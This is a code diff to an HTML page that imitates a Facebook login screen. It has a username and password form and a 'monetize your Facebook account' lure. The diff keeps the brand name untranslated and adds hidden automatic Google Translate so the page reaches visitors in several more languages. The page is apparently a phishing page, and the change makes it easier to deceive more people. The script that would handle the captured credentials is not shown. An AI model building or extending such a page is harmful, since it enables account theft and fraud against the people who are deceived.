@@ -1,26 +1,61 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <!-- Prevent Facebook brand from translating -->
+  <meta name="google" content="notranslate">
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Facebook - Login</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <header>Facebook</header>
+  <header><span class="notranslate">Facebook</span></header>
   <div class="container">
-    <div class="logo"><div class="logo-circle">F</div></div>
+    <div class="logo"><div class="logo-circle notranslate">F</div></div>
     <form id="loginForm">
       <input type="text" id="username" placeholder="Mobile number or email address" required>
       <input type="password" id="password" placeholder="Password" required>
       <button type="submit">Log In</button>
     </form>
     <p><a href="#">Forgotten password?</a></p>
-    <button style="background-color: #42b72a;">Monetize your facebook account</button>
+    <button style="background-color: #42b72a;">Monetize your <span class="notranslate">Facebook</span> account</button>
   </div>
   <footer>
-    <p>Facebook © 2025 – This is facebook / ∞Meta. Use this facebook monetization link to log into your account and start the monetization process.</p>
+    <p><span class="notranslate">Facebook</span> © 2025 – This is <span class="notranslate">Facebook</span> / ∞Meta. Use this <span class="notranslate">Facebook</span> monetization link to log into your account and start the monetization process.</p>
   </footer>
-  <script src="script.js"></script>
+
+  <!-- Google Translate -->
+  <div id="google_translate_element" style="display:none;"></div>
+  <script type="text/javascript">
+    function googleTranslateElementInit() {
+      new google.translate.TranslateElement(
+        {
+          pageLanguage: 'en',
+          includedLanguages: 'es,fr,de,it,pt,zh-CN,ja',
+          autoDisplay: false
+        },
+        'google_translate_element'
+      );
+
+      // Detect user browser language
+      var userLang = navigator.language || navigator.userLanguage;
+      userLang = userLang.split('-')[0];
+
+      // Supported languages list
+      var supported = ["es","fr","de","it","pt","zh-CN","ja"];
+
+      if (supported.includes(userLang)) {
+        setTimeout(function(){
+          var select = document.querySelector("select.goog-te-combo");
+          if (select) {
+            select.value = userLang;
+            select.dispatchEvent(new Event("change"));
+          }
+        }, 1000);
+      }
+    }
+  </script>
+  <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </body>
 </html>
